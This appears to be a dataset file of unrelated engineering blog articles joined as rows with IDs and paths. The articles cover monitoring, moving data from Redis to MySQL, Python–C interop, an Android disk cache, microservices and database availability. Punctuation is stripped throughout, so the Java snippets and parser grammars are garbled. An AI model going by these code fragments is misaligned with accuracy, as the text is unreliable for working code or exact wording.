ahead of it   Remnants of the old monolith  affectionately called  the Mothership   are still around today   JAXenter  What is Prometheus   Fabian Reinartz and Bj rn Rabenstein  Prometheus is an open source systems monitoring and alerting ecosystem  It was built with modern cloud and container environments in mind and supports multiple types of dynamic service discovery  Kubernetes  Marathon  EC2  etc    It offers a multi dimensional data model and a powerful query language  The project s website has all the details   JAXenter  What plans do you have with Prometheus  Where do you see the project  from a development perspective  in the next few months   Fabian Reinartz and Bj rn Rabenstein  The Prometheus project has more than 200 contributors and is in very active development  Most of the many components have frequent releases with many enhancements and new features  Also  there is a steadily growing number of 3rd party integrations  as part of the Prometheus project itself or externally maintained  Here is the list   Hot off the press is the new Alertmanager  a complete rewrite of the previous version  which was merely meant as a proof of concept  but already revolutionized the way alerting is handled in many organizations  The various ways of Kubernetes integration are a current hotspot of development  too  We expect convergence towards a stable feature set in both areas over the next months   The upcoming release 0 18 of the Prometheus server  the central component of the ecosystem  features a lot of internal improvements  which are nevertheless visible to the user as they will spectacularly improve performance in certain use cases and increase storage efficiency by a factor of two to three   Thank you very much,"[899 830 1126 773 92 257 234 1192 1159 520 1297]"
902,training-dataset/engineering/858.txt,engineering,Moving persistent data out of RedisHistorically  we have used Redis in two ways at GitHub   We used it as an LRU cache to conveniently store the results of expensive computations over data originally persisted in Git repositories or MySQL  We call this transient Redis   We also enabled persistence  which gave us durability guarantees over data that was not stored anywhere else  We used it to store a wide range of values  from sparse data with high read write ratios  like configuration settings  counters  or quality metrics  to very dynamic information powering core features like spam analysis  We call this persistent Redis   Recently we made the decision to disable persistence in Redis and stop using it as a source of truth for our data  The main motivations behind this choice were to   Reduce the operational cost of our persistence infrastructure by removing some of its complexity   Take advantage of our expertise operating MySQL   Gain some extra performance  by eliminating the I O latency during the process of writing big changes on the server state to disk   Transitioning all that information transparently involved planning and coordination  For each problem domain using persistent Redis  we considered the volume of operations  the structure of the data  and the different access patterns to predict the impact on our current MySQL capacity  and the need for provisioning new hardware   For the majority of callsites  we replaced persistent Redis with GitHub  KV   a MySQL key value store of our own built atop InnoDB  with features like key expiration  We were able to use GitHub  KV almost identically as we used Redis  from trending repositories and users for the explore page  to rate limiting to spammy user detection   Our biggest challenge  Migrating the activity feeds  We have lots of  events  at GitHub  Starring a repository  closing an issue and pushing commits are all events that we display on our activity feeds  like the one found on your GitHub homepage   We used Redis as a secondary indexer for the MySQL table that stores all our events  Previously  when an event happened  we  dispatched  the event identifier to Redis keys corresponding to each user s feed that should display the event  That s a lot of write operations and a lot of Redis keys and no single table would be able to handle that fanout  We weren t going to be able to simply replace Redis with GitHub  KV everywhere in this code path and call it a day   Our first step was to gather some metrics and let them tell us what to do  We pulled numbers for the different types of feeds we had and calculated the writes and reads per second for each timeline type  e g   issue events in a repository  public events performed by a user  etc    One timeline wasn t ever read  so we were able to axe it right away and immediately knock one off the list  Of the remaining timelines  two were so write heavy that we knew we couldn t port them to MySQL as is  So that s where we began   Let s walk through how we handled one of the two problematic timelines  The  organization timeline  that you can see if you toggle the event feed on your home page to one of the organizations you belong to  accounted for 67  of the more than 350 million total writes per day to Redis for these timelines  Remember when I said we  dispatched  event IDs to Redis for every user that should see them  Long story short   we were pushing event IDs to separate Redis keys for every event and every user within an org  So for an active organization that produces  say  100 events per day and has 1000 members  that would potentially be 100 000 writes to Redis for only 100 events  Not good  not efficient  and would require far more MySQL capacity than what we are willing to accept   We changed up how writing to and reading from Redis keys worked for this timeline before even thinking about MySQL  We d write every event happening to one key for the org  and then on retrieval  we d reject those events that the requesting user shouldn t see  Instead of doing the filtering each time the event is fanned out  we d do it on reads   This resulted in a dramatic 65  reduction of the write operations in for this feature  getting us closer to the point were we could move the activity feeds to MySQL entirely   Although the single goal in mind was to stop using Redis as a persistent datastore  we thought that  given this was a legacy piece of code that evolved organically over the years  there would be some room for improving its efficiency as well  Reads were fast because the data was properly indexed and compact  Knowing that  we decided to stop writing separately to certain timelines that we could compose from the events contained in others  and therefore reduce the remaining writes another 30    11  overall   We got to a point that we were writing less than 1500 keys per second 98  of the time  with spikes below 2100 keys written per second  This was a volume of operations we thought we could handle with our current MySQL infrastructure without adding any new servers   While we prepared to migrate the activity feeds to MySQL  we experimented with different schema designs  tried out one record per event normalization and fixed size feed subsets per record  and we even experimented with MySQL 5 7 JSON data type for modeling the list of event IDs  However we finally went with a schema similar to that of GitHub  KV   just without some of the features we didn t need  like the record s last updated at and expiration timestamps   On top of that schema  and inspired by Redis pipelining  we created a small library for batching and throttling writes of the same event that were dispatched to different feeds   With all that in place  we began migrating each type of feed we had  starting with the least  risky   We measured risk of migrating any given type based on its number of write operations  as reads were not really the bottleneck   After we migrated each feed type  we checked cluster capacity  contention and replication delay  We had feature flags in place that enabled writes to MySQL  while still writing to persistent Redis  so that we wouldn t disrupt user experience if we had to roll back  Once we were sure writes were performing well  and that all the events in Redis were copied to MySQL  we flipped another feature flag to read from the new data store  again measured capacity  and then proceeded with the next activity feed type   When we were sure everything was migrated and performing properly we deployed a new pull request removing all callsites to persistent Redis  These are the resulting performance figures as of today   We can see how at the store level  writes   mset   are below 270wps at peak  with reads   mget   below 460ps  These values are way lower than the number of events being written thanks to the way events are batched before writes   Replication delay is below 180 milliseconds at peak  The blue line  correlated with the number of write operations  shows how delay is checked before any batch is written to prevent replicas from getting out of sync   What we learned  At the end of the day we just grew out of Redis as a persistent datastore for some of our use cases  We needed something that would work for both github com and GitHub Enterprise  so we decided to lean on our operational experience with MySQL  However  clearly MySQL isn t a one size fits all solution and we had to rely on data and metrics to guide us in our usage of it for our event feeds at GitHub  Our first priority was moving off of persistent Redis  and our data driven approach enabled us to optimize and improve performance along the way   Work with us  Thank you to everybody on the Platform and Infrastucture teams who contributed to this project  If you would like to work on problems that help scale GitHub out  we are looking for an engineer to join us  The Platform team is responsible for building a resilient  highly available platform for internal engineers and external integrators to add value to our users   We would love you to join us  Apply here,"[902 613 1049 1336 606 673 1295 310 980 276 373]"
915,training-dataset/engineering/822.txt,engineering,PayPal Engineering BlogMahmoud s note  This will be my last post on the PayPal Engineering blog  If you ve enjoyed this sort of content subscribe to my blog pythondoeswhat com or follow me on Twitter  It s been fun   All the world is legacy code  and there is always another  lower layer to peel away  These realities cause developers around the world to go on regular pilgrimage  from the terra firma of Python to the coasts of C  From zlib to SQLite to OpenSSL  whether pursuing speed  efficiency  or features  the waters are powerful  and often choppy  The good news is  when you re writing Python  C interactions can be a day at the beach   As the name suggests  CPython  the primary implementation of Python used by millions  is written in C  Python core developers embraced and exposed Python s strong C roots  taking a traditional tack on portability  contrasting with the  write once  debug everywhere  approach popularized elsewhere  The community followed suit with the core developers  developing several methods for linking to C  Years of these interactions have made Python a wonderful environment for interfacing with operating systems  data processing libraries  and everything the C world has to offer   This has given us a lot of choices  and we ve tried all of the standouts   Approach Vintage Representative User Notable Pros Notable Cons C extension modules 1991 Standard library Extensive documentation and tutorials  Total control  Compilation  portability  reference management  High C knowledge  SWIG 1996 crfsuite Generate bindings for many languages at once Excessive overhead if Python is the only target  ctypes 2003 oscrypto No compilation  wide availability Accessing and mutating C structures cumbersome and error prone  Cython 2007 gevent  kivy Python like  Highly mature  High performance  Compilation  new syntax and toolchain  cffi 2013 cryptography  pypy Ease of integration  PyPy compatibility New High velocity   There s a lot of history and detail that doesn t fit into a table  but every option falls into one of three categories   Each has its merits  so we ll explore each category  then finish with a real  live  worked example   Python s core developers did it and so can you  Writing C extensions to Python gives an interface that fits like a glove  but also requires knowing  writing  building  and debugging C  The bugs are much more severe  too  as a segmentation fault that kills the whole process is much worse than a Python exception  especially in an asynchronous environment with hundreds of requests being handled within the same process  Not to mention that the glove is also tailored to CPython  and won t fit quite right  or at all  in other execution environments   At PayPal  we ve used C extensions to speed up our service serialization  And while we ve solved the build and portability issue  we ve lost track of our share of references and have moved on from writing straight C extensions for new code   After years of writing C  certain developers decide that they can do better  Some of them are certainly onto something   Cython is a superset of the Python programming language that has been turning type annotated Python into C extensions for nearly a decade  longer if you count its predecessor  Pyrex  Apart from its maturity  the points that matters to us are   Every Python file is a valid Cython file  enabling incremental  iterative optimization  The generated C is highly portable  building on Windows  Mac  and Linux  It s common practice to check in the generated C  meaning that builders don t need to have Cython installed   Not to mention that the generated C often makes use of performance tricks that are too tedious or arcane to write by hand  partially motivated by scientific computing s constant push  And through all that  Cython code maintains a high level of integration with Python itself  right down to the stack trace and line numbers   PayPal has certainly benefitted from their efforts through high performance Cython users like gevent  lxml  and NumPy  While our first go with Cython didn t stick in 2011  since 2015  all native extensions have been written and rewritten to use Cython  It wasn t always this way however   An early contributor to Python at PayPal got us started using SWIG  the Simplified Wrapper and Interface Generator  to wrap PayPal C   infrastructure  It served its purpose for a while  but every modification was a slog compared to more Pythonic techniques  It wasn t long before we decided it wasn t our cup of tea   Long ago SWIG may have rivaled extension modules as Python programmers  method of choice  These days it seems to suit the needs of C library developers looking for a fast and easy way to wrap their C bindings for multiple languages  It also says something that searching for SWIG usage in Python nets as much SWIG replacement libraries as SWIG usage itself   So far all our examples have involved extra build steps  portability concerns  and quite a bit of writing languages other than Python  Now we ll dig into some approaches that more closely match Python s own dynamic nature  ctypes and cffi   Both ctypes and cffi leverage C s Foreign Function Interface  FFI   a sort of low level API that declares callable entrypoints to compiled artifacts like shared objects   so files  on Linux FreeBSD etc  and dynamic link libraries   dll files  on Windows  Shared objects take a bit more work to call  so ctypes and cffi both use libffi  a C library that enables dynamic calls into other C libraries   Shared libraries in C have some gaps that libffi helps fill  A Linux  so  Windows  dll  or OS X  dylib is only going to provide symbols  a mapping from names to memory locations  usually function pointers  Dynamic linkers do not provide any information about how to use these memory locations  When dynamically linking shared libraries to C code  header files provide the function signatures  as long as the shared library and application are ABI compatible  everything works fine  The ABI is defined by the C compiler  and is usually carefully managed so as not to change too often   However  Python is not a C compiler  so it has no way to properly call into C even with a known memory location and function signature  This is where libffi comes in  If symbols define where to call the API  and header files define what API to call  libffi translates these two pieces of information into how to call the API  Even so  we still need a layer above libffi that translates native Python types to C and vice versa  among other tasks   ctypes is an early and Pythonic approach to FFI interactions  most notable for its inclusion in the Python standard library   ctypes works  it works well  and it works across CPython  PyPy  Jython  IronPython  and most any Python runtime worth its salt  Using ctypes  you can access C APIs from pure Python with no external dependencies  This makes it great for scratching that quick C itch  like a Windows API that hasn t been exposed in the os module  If you have an otherwise small module that just needs to access one or two C functions  ctypes allows you to do so without adding a heavyweight dependency   For a while  PayPal Python code used ctypes after moving off of SWIG  We found it easier to call into vanilla shared objects built from C   with an extern C rather than deal with the SWIG toolchain  ctypes is still used incidentally throughout the code for exactly this  unobtrusively calling into certain shared objects that are widely deployed  A great open source example of this use case is oscrypto  which does exactly this for secure networking  That said  ctypes is not ideal for huge libraries or libraries that change often  Porting signatures from headers to Python code is tedious and error prone   cffi  our most modern approach to C integration  comes out of the PyPy project  They were seeking an approach that would lend itself to the optimization potential of PyPy  and they ended up creating a library that fixes many of the pains of ctypes  Rather than handcrafting Python representations of the function signatures  you simply load or paste them in from C header files   For all its convenience  cffi s approach has its limits  C is really almost two languages  taking into account preprocessor macros  A macro performs string replacement  which opens a Fun World of Possibilities  as straightforward or as complicated as you can imagine  cffi s approach is limited around these macros  so applicability will depend on the library with which you are integrating   On the plus side  cffi does achieve its stated goal of outperforming ctypes under PyPy  while remaining comparable to ctypes under CPython  The project is still quite young  and we are excited to see where it goes next   We promised an example  and we almost made it three   PKCS11 is a cryptography standard for interacting with many hardware and software security systems  The 200 plus page core specification includes many things  including the official client interface  A large set of C header style information  There are a variety of pre existing bindings  but each device has its own vendor specific quirks  so what are we waiting for   As stated earlier  ctypes is not great for sprawling interfaces  The drudgery of converting function signatures invites transcription bugs  We somewhat automated it  but the approach was far from perfect   Our second approach  using cffi  worked well for our first version s supported feature subset  but unfortunately PKCS11 uses its own CK_DECLARE_FUNCTION macro instead of regular C syntax for defining functions  Therefore  cffi s approach of skipping  define macros will result in syntactically invalid C code that cannot be parsed  On the other hand  there are other macro symbols which are compiler or operating system intrinsics  e g  __cplusplus   _WIN32   __linux__    So even if cffi attempted to evaluate every macro  we would immediately runs into problems   So in short  we re faced with a hard problem  The PKCS11 standard is a gnarly piece of C  In particular   Many hundreds of important constant values are created with  define Macros are defined  then re defined to something different later on in the same file pkcs11f h is included multiple times  even once as the body of a struct  In the end  the solution that worked best was to write up a rigorous parser for the particular conventions used by the slow moving standard  generate Cython  which generates C  which finally gives us access to the complete client  with the added performance bonus in certain cases  Biting this bullet took all of a day and a half  we ve been very satisfied with the result  and it s all thanks to a special trick up our sleeves   Parsing expression grammars  PEGs  combine the power of a true parser generating an abstract syntax tree  not unlike the one used for Python itself  with the convenience of regular expressions  One might think of PEGs as recursive regular expressions  There are several good libraries for Python  including parsimonious and parsley  We went with the former for its simplicity   For this application  we defined a two grammars  one for pkcs11f h and one for pkcs11t h   PKCS11F GRAMMAR file     comment   func           func   func_hdr func_args func_hdr    CK_PKCS11_FUNCTION_INFO   name     func_args   arg_hdr      arg         endif  arg_hdr      ifdef CK_NEED_ARG_LIST        comment     arg       type     name           comment name   identifier type   identifier identifier       A Z_  A Z0 9_    i comment                   ms PKCS11T GRAMMAR file     comment   define   typedef   struct_typedef   func_typedef   struct_alias_typedef   ignore     typedef     typedef  type identifier     struct_typedef     typedef struct  identifier             comment   member          identifier     struct_alias_typedef     typedef struct  identifier   CK_PTR    identifier     func_typedef     typedef CK_CALLBACK_FUNCTION CK_RV   identifier        identifier identifier       comment             member   identifier identifier array_size       comment   array_size           0 9         define     define  identifier   hexval   decval       0UL     identifier          A Z_    0x 0 9  8       hexval       0x A F0 9  8   i decval        0 9    type     unsigned char      unsigned long int      long int      identifier   CK_PTR      identifier identifier             A Z_  A Z0 9_    i comment                         ms ignore        ifndef  identifier        endif         Short  but dense  in true grammatical style  Looking at the whole program  it s a straightforward process   Apply the grammars to the header files to get our abstract syntax tree  Walk the AST and sift out the semantically important pieces  function signatures in our case  Generate code from the function signature data structures   Using only 200 lines of code to bring such a massive standard to bear  along with the portability and performance of Cython  through the power of PEGs ranks as one of the high points of Python in practice at PayPal   It s been a long journey  but we stayed afloat and we re happy to have made it  To recap   Python and C are hand in glove made for one another   Different C integration techniques have their applications  our stances are  ctypes for dynamic calls to small  stable interfaces cffi for dynamic calls to larger interfaces  especially when targeting PyPy Old fashioned C extensions if you re already good at them Cython based C extensions for the rest SWIG pretty much never  Parsing Expression Grammars are great   All of this encapsulates perfectly why we love Python so much  Python is a great starter language  but it also has serious chops as a systems language and ecosystem  That bottom to top  rags to riches  books to bits story is what makes it the ineffable  incomparable language that it is   C you around   Kurt and Mahmoud,"[915 806 673 1117 641 1351 234 370 778 1300 92]"
929,training-dataset/engineering/358.txt,engineering,Building an Open Source  Carefree Android Disk CacheBuilding an Open Source  Carefree Android Disk Cache  Caching various files on disk has always been an integral part of many mobile apps  At Instagram  we use caching to store and recover images  videos  and text files  As a media heavy application  the Instagram Android app requires a lightweight but stable disk cache system  When we first built the app  we started with the open source DiskLruCache library  It served us well until we found one major issue with the cache s design  the cache code s exception handling logic is cumbersome and prone to developer error   For example  the following code snippet shows how to properly handle a simple write to disk operation using DiskLruCache      Writing to Cache before using IgDiskCache  if  mDiskLruCache    null     final String key   hashKeyForDisk data    DiskLruCache Editor editor   null   OutputStream out   null   try    editor   mDiskLruCache edit key    if  editor    null     out   editor newOutputStream DISK_CACHE_INDEX    writeFileToOutputStream out    out close     editor commit          catch  IOException e     if  out    null     try    out close       catch  IOException e     Log d LOG_TAG   can t close output stream   e          if  editor    null     try       This is an Instagram modification to DiskLruCache      Making sure the cache will be in a good state even if an IOException is thrown   editor removeEntryAndAbort       catch  IOException e     Log d LOG_TAG   can t abort editor   e               else       Handle the disk cache not available case      As you can see  because the DiskLruCache doesn t support stub instances  when the file storage is not available  either the cache directory not accessible  or there is not enough storage space left   we have no choice but to let the mDiskLruCache fallback to NULL  This seemingly harmless fallback requires all engineers to explicitly check that the cache is not equal to NULL before they ever want to use it  After confirming that the cache is available  the disk caching code also needs to go two extra steps to get to the OutputStream  retrieving the Editor object from the cache entry using the cache key  and then getting the OutputStream from the Editor  Both of these steps might throw IOExceptions  and the retrieving Editor from disk cache could also return NULL  If any of these failed cases ever happens  the engineers need to figure out on their own how to gracefully handle the crash  properly close all the streams editors snapshots  and make sure the partial files won t mess up the cache   If you think this is already complicated  just imagine how complicated it could get when handling two editors in the same code block  or implementing a read process write case inside a single method  Missing any one of those NULL checking or mishandling any of the IOExceptions will result in many crashes daily on client devices  Over time  as our app becomes more complex and more engineers joined and worked on the same code base  the disk caching code became extremely flaky and hard to maintain  For over a year  cache related NPEs  Null Pointer Exception  and IOExceptions topped our crash list  After doing several small patches  we soon figured out these small fixes won t solve the problem  The fix made the code look even worse  and new crashes kept coming   To fix the issue completely  we knew we had to rethink what a disk cache is  and to redesign the disk cache to make the whole thing easier to use and maintain  A cache  by definition  can always tell the developer  I don t have this item   We use this principle to simplify the case that the cache can t even be opened  or that there are disk errors  We simply report that we don t have the item  and let writes fail silently  And for cases like IOExceptions  we ideally shouldn t let the developers guess what s happening inside the cache  and handle all the possible scenarios  The cache should be smart enough to handle most of the failed cases itself  and guarantee that no incomplete file will be cached and that all cache entries get closed properly   When we decided to build IGDiskCache  we decided to focus on four main changes   1  Simplify cache initialization and null checking  Support stub cache instance when the disk cache is not available or accessible  so that we don t need to check the mDiskLruCache    null every time we want to use it   Handle the IOExceptions smartly  as most of the exception handling logic  e g  close cache entry  close input output stream  discard the incomplete file  is reusable and there is no need to make the programmers handle all these edge cases themselves   Flatten the cache  and remove the unnecessary level of Editors Snapshots  This makes the cache entry s commit abort close logic much cleaner and easier to read   Prevent engineers from mis using the cache  This includes requiring NULL checking for the cache entries after retrieving them from the cache  and ensuring all the time consuming tasks  like cache initialization and close  to be executed only on non UI threads   From initial design to implementation  it took us about a month to build the initial version of the IgDiskCache  and a few more weeks to update all the call sites and test the module thoroughly  After we launched it in production  we were able to dramatically reduce the number of crashes in the app  Also  because of the built in enhanced checking conditions  IgDiskCache was able to help us identify quite a few race conditions in our apps which were extremely hard to detect otherwise  The UI thread checking also prevents engineers from executing inefficient disk IO operations on the main thread  The code also looks much simpler  and easier to reason about      Writing to cache using IgDiskCache  OptionalStream  EditorOutputStream  output   mIgDiskCache edit key    if  output isPresent       EditorOutputStream outputStream   output get     try    writeFileToOutputStream outputStream    outputStream commit       catch  IOException e     outputStream abort           Our story with IgDiskCache is a good example of how we tackle app reliability issues  and make our code cleaner and easier to maintain  We hope you ll find it useful too   We recently moved our mobile infrastructure engineering teams  iOS and Android  to New York City  If this blog post got you excited about what we re doing  we re hiring   check out our careers page   Jimmy  He  Zhang is a software engineer at Instagram,"[929 1336 1399 214 673 1300 550 1101 1403 778 895]"
935,training-dataset/engineering/745.txt,engineering,An Incremental Path to Microservices   RHD BlogAn Incremental Path to Microservices  As a consultant for Red Hat  I have the privilege of seeing many customers  Some of them are working to find ways to split their applications in smaller chunks to implement the microservices architecture  I m sure this trend is generalized even outside my own group of the customers   There is undoubtedly hype around microservices  Some organizations are moving toward microservices because it s a trend  rather than to achieve a clear and measurable objective   In the process  these organizations are missing a few key points  and when we all awake from this microservices  hype   some of these organizations will discover that they now have to take care of ten projects when before they had one  without any tangible gain   To understand what it takes to reap real benefits from microservices  let s look at how this neologism came to being   Microservices  as a term  was born in the context of some of the Silicon Valley unicorns  such as Facebook  Google  PayPal  Netflix   These companies were splitting their large monolithic code bases in smaller chunks and assigning these new codebases to small and autonomous teams  The results seemed amazing  and industry observers decided to coin a new word to describe this process   Unluckily  although the contribution of these consultants was huge for the IT community at large  the word choice was poor because it leads people to think that the size of your services has some relevance  while size does not matter   Also  the service part of the name is not particularly meaningful  In fact  after SOA  we have learned everything there is to know about services and the microservices style does not add too much to that discussion  yes  REST has replaced SOAP  but that is irrelevant from an architectural perspective    What this definition fails to capture is that the key reason for the success of those avant garde companies were the small autonomous teams  this concept is also known as the 2 pizza team   These teams  four to eight people  had the ability to self provision the resources necessary to run their apps and had end to end responsibility for them  including for the production environment  so  yes  they were carrying a pager   A better definition could have been micro and autonomous teams  putting the emphasis on the organizational aspects  But the name stuck  and it s not going to change   The full autonomy  the lack of bureaucracy and the full automation of all the processes  including infrastructure provisioning  were the factors that made those small teams successful   I believe the roadmap to microservices can be an incremental one and I have summarized one process that is working in a few companies  see this blog for example   These steps are self contained and each one of them will bring value even if the following are not pursued  here they are   Build a cloud capability  Deploy your applications to your cloud  Automate your delivery pipeline  Give your delivery teams full end to end responsibility for their code  Break up your delivery teams and code in smaller units   Notice that when the aforementioned consultants were visiting those Silicon Valley companies  step one  two and three were already completed and probably that is why these steps were so overlooked  but many traditional enterprises are not there yet and should worry about them before jumping to splitting the code   Build a cloud capability  A cloud capability is necessary to give your delivery team the ability to self provision the infrastructure they need  This is a foundational step towards full application team autonomy   Much has been already written on how to create an enterprise strategy to build a cloud capability  whether it is on premise or on a vendor cloud   The only thing I have to add is that today cloud means container based cloud  here you can find some reasoning around this concept    If you don t yet have a cloud capability  consider jumping directly to a container based cloud   If you have a virtual machine based cloud strategy in flight  consider layering a container based cloud strategy on top of it  You can use your VM based cloud to run your container cluster manager and other workloads that you don t want to containerize  but you should give your delivery teams access only to the container based cloud   Deploy your applications to your cloud  Make your  cloud migrant  applications able to work in the cloud and deploy them there  Keep working on your applications until they become cloud native   The type of work needed to make your application work in the cloud is application dependent and cloud dependent  But  there are some commonalities   Things in the cloud are extremely dynamic  for example servers don t necessarily have always the same IP  and your application needs to adapt to it   In order to cope with the cloud and at the same time leverage some of the features of the cloud  such as self healing capability and elasticity  your applications will need to adapt over time some of best practices contained in 12 factor principles or implemented the Netflix OSS stack  In this article  you can find a series of architectural cross cutting concerns that I believe you should consider when migrating your workloads to the clouds   If you complete this step  you ll be able to easily change your application architecture and topology  thanks to the fact that you can dynamically provision your infrastructure quickly  This opens the door to fast experimentation  For example  you want to try Redis as a distributed memory cache as opposed to the enterprise approved tools  you just deploy it and try it   Automate your delivery pipeline  There is no need to highlight more on how important is to automate your delivery process as much as possible  Here is an enlightening video on what a delivery pipeline should look like   The objective here is to reduce the cost and time of moving your code through environments and eventually to production while improving deployment accuracy  consistency  and repeatability   I recommend applying the principles of immutable infrastructure when designing your delivery pipeline  In other words  the only way to modify your infrastructure should be to destroy and rebuild it with the new definition   In my experience  the most difficult step to achieve is automated integration tests  so my advice is to start working on it as soon as you can  Automating integration tests may have organizational impacts because the team doing manual tests will be required to turn into a team that writes code  test code   This can be a difficult transformation  A good automated test suite is a suite that everybody trusts to the point that nobody feels the need to do manual tests  except for exploratory testing and UAT    It is important to understand that if you don t automate your tests  you won t be able to increase your speed of delivery beyond a certain value  That value is exactly how long it takes your test team to manually retest the entire application  From what I ve seen  this value tends to hover around three four weeks  If your objective is to deliver with a higher frequency than that  the only way to remove that constraint is to fully automate your tests   Given the plasticity of the environment that you have created in the previous steps  it is now relatively easy to add environments dynamically so that you can spin them up and down based on need  You should use this capability to automate load tests   Give your delivery teams full end to end responsibility  Many companies  IT looks like the below diagram from an organizational standpoint   In order to give your delivery team full end to end accountability you need to move your organization towards something that looks like the following   This is what many of the Silicon Valley startups do  and it is described in more details in a famous Spotify blog  part 1 and part 2    This step eliminates meetings and bureaucracy because now your delivery team is in charge of all the aspects of your application lifecycle   Obviously  in order for your delivery team to be successful in this role  you will have to beef it up with new skills  You will need  T  type people as opposed to  I  types  The shape of the letter refers to the skill profile of an individual  An  I  type can do one thing very well  A  T  type is specialized in one thing  but can also do other things at a decent level  for example code well in Java  but also create basic containers    This is going to be an important transformation for your organization and I am skeptical that all organizations will really want to go through it  In this new configuration  your Ops team becomes much slimmer and focused only on keeping your cloud services up and running  Your cloud infrastructure will run all your applications and it will have to be more reliable and more available than any of the applications you run on it   Conversely  your delivery teams will become larger and acquire new responsibilities  This growth is what will bring you to the last step   Break up your delivery teams and code in smaller units  Your delivery teams may have become bulkier and slower moving than you wanted in the previous step  This step corrects the issue by splitting the teams and consequently the code they manage into smaller chunks  As mentioned before the ideal size of the 2 pizza teams seems to be around 4 and 8 people  This may be a difficult process because all teams still need to have the right balance of skills  which can be difficult to achieve with smaller teams   In the end  your organization will look like the following     This step will make your organization look like one of the Silicon Valley unicorns and in theory  will enable you to achieve the same level of delivery speed  That means the very high frequency of delivery or even continuous releases in which every time a code push is sent to your versioning systems a new release in production is performed   Conclusions  As I was saying in the introduction  I m seeing several customers doing step number 5  for the code only   without having completed the previous steps  I don t recommend doing that  I also don t think that microservices as in steps one to five are necessarily for every organization  I argue that many organizations  especially those that are heavily regulated  would gain enormous benefits from just moving their workloads to the cloud and by fully automating their processes  steps one to three    Join Red Hat Developers  a developer program for you to learn  share  and code faster   and get access to Red Hat software for your development  The developer program and software are both free,"[935 773 1373 61 830 60 87 234 695 778 278]"
941,training-dataset/product/557.txt,product,50 Things I ve Learned About Product Management   Hacker NoonBlocked Unblock Follow Following  Multiple hat wearer  Product development nut  I love wrangling complex problems and answering the why with qual quant data,"[941 582 1042 1101 606 308 85 61 673 344 935]"
946,training-dataset/engineering/1483.txt,engineering,Performance  Scalability  and High Availability  3 Key Infrastructure Adaptability RequirementsThursday  February 2  2017 at 12 31PM  This is a guest post by Tony Branson   Performance  scalability  and HA are often used interchangeably  and any confusion about them can result in unrealistic metrics and deployment delays  It is important to invest your time and understand the differences among these three approaches before you invest your money in resilient systems   Performance  Performance means system throughput under a given workload for a specific timeframe  Performance is validated by testing the scalability and the reliability of hardware  software and network  It is an ongoing process and not an end result  Performance requirements undergo massive changes as features and functionalities get added and eliminated to accommodate evolving business requirements   Scalability  Scalability simply refers to the ability of an application or a system to handle a huge volume of workload or expand in response to an increased demand for database access  processing  networking  or system resources   High Availability  High availability is when your apps remain available and accessible without any interruption and serve their intended function seamlessly  HA is achieved when your database cluster continues to operate  for example  even if one or more servers are blown up  shut down  or simply disengaged unexpectedly from the rest of the network   Factors Affecting HA  Ensuring that apps hosted in the middle tier remain up and running requires database failover mechanism that directs queries to another server with a copy of the same data  To deliver availability during a database failover you must ensure that   The same components should be deployed to every instance in the cluster  Your failover mechanism should be aware of the availability of nodes in a given cluster along with their location  The failover mechanism should also track the progress of all the tasks so as to ensure a roll back when a given operation has failed  In case one of the servers in a cluster fails  database load balancing software in combination with a failover mechanism can ensure seamless rerouting of requests while preventing disruptions to the other users accessing the rest of the cluster   Shifting the focus from Over Optimization to Scalability  The most common mistake people make is over optimization  buying more infrastructure than they need  This approach is not only expensive  complicated and time consuming  but it also needs top notch engineering talent and expert consulting  In addition to increasing overall costs  it also wastes capital on non revenue generating investments  Instead  shift your focus to scalability and shop for performance because if you invest in a high end rack of servers it might cost you roughly  30 000 but if your DBAs and app developers have been working on your scalability plan for the past two months  the cost would be nothing less than  100 000  Be sure to calculate the cost of servers over their lifetime  So buy what you need today and wait to buy more until you must   Deploying Scalable Systems  Service level agreements determine the need for horizontal or vertical scaling  A stock trading system needs to scale instantly whereas an eCommerce app needs to scale only during big sale seasons when the traffic spikes  Database load balancing can help maximize throughput and minimize response times by distributing queries across multiple database servers   Achieving High Availability with Database Load Balancing  Deploying database load balancing software is the best way to architect infrastructures for maximum resiliency in a manner that meets your business continuity needs   Database load balancing software sits transparently between the applications and your database servers to ensure instant routing of traffic without needing application modifications  With database load balancing software  it is possible to scale out transparently and scale up instantly  It assures data recovery following a disaster  business continuity even with a high volume of traffic  reduced troubleshooting time with real time root cause identification  and automatic failover without experiencing disruption or downtime  With advanced database load balancing features it empowers a server cluster to achieve high scalability  high performance and high availability at the same time  So  if you are not load balancing your database traffic  you end up spending a lot of time building efficiencies your enterprise will never put to use  Why put a Porsche engine on your skateboard if all you require is a skateboard,"[946 889 699 1336 36 1403 1373 373 1351 92 393]"
952,training-dataset/engineering/124.txt,engineering,Rewriting Uber Engineering  The Opportunities Microservices Provideby Emily Reinhold  A few months back  we discussed Uber s decision to abandon its monolithic codebase in favor of a modular  flexible microservice architecture  Since then  we ve devoted many thousands of engineering hours to expanding this ecosystem of Uber microservices  several hundred and counting   written in a variety of languages and using many different frameworks  This ongoing refactor is a huge undertaking  so we took the opportunity to adopt a new suite of technologies for building microservices at Uber  With a tech stack and standards well suited for the SOA migration  we have streamlined service development at Uber   Starting a New Service  In a rapidly growing engineering organization  it can be difficult to keep track of all the efforts underway  This kind of growth demands a process to prevent duplicating work across teams  At Uber  we have solved this problem by requiring that authors of new services submit a Request for Comments  RFC   a high level proposal of the new service that outlines its purpose  architecture  dependencies  and other implementation details for the rest of Uber Engineering to discuss  The RFC serves two purposes  1  to solicit feedback for improving the service s quality as it s developed and 2  to prevent duplicate efforts or expose opportunities for collaboration   Several other engineers who are familiar with the domain review the service s design  Once feedback has been incorporated into the service proposal  the fun and games of building the service begin   Implementing a New Service  Tincup  our currency and exchange rate service  is a great example of how a microservice at Uber is implemented  Tincup is the interface for up to date currency and exchange rate data  It serves two major endpoints  one to get a currency object and a second to get the current exchange rate for a given currency  per USD   These endpoints are necessary because Uber is a global business  Exchange rates change often  and we facilitate transactions in nearly 60 currencies   Bootstrapping Microservices with New Technologies  Rewriting all logic related to currencies and exchange rates while building Tincup provided a good opportunity to reevaluate some design decisions at Uber that were made long ago  We used a flurry of new frameworks  protocols  and conventions to implement Tincup   MVCS  First  we addressed the overall structure of code related to currencies and exchange rates  At Uber  we have modified the persistence layer of many datasets  like this one  several times in recent years  Each change is long and cumbersome  We have learned from this process that  if possible  it is best to separate the persistence layer specifics from the application logic  This leads to an application development approach we refer to as MVCS  which extends the common MVC approach to include a service layer where application logic lives  By secluding the application logic in the service layer from other parts of the application  the persistence layer can evolve or be replaced without refactoring business logic  only the code dealing directly with storing reading the data needs to change    UDR  Second  we considered the persistence layer for currencies and exchange rates  Before Tincup  this data was stored 